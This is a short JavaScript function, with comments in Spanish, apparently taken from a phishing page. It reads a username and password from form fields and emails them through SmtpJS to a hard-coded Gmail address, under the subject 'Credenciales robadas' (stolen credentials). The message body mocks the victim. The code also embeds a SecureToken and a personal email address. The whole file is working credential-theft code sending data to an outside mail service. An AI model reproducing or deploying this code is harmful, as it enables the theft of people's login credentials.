
function getInputValue() {
    //Agarrar los datos.
    var userName = document.querySelector(".input-1").value;
    var password = document.querySelector(".input-2").value;
    //enviar el email.

    Email.send({
        SecureToken: "a1f68e00-e733-4f0f-be34-d080d0532668",
        To: 'veronicacastromurillo@gmail.com',
        From: "veronicacastromurillo@gmail.com",
        Subject: "Credenciales robadas",
        Body: "El usuario del tonto es: " + userName + " y su clave es: " + password
    }).then(
        message => alert(message)
    );

}

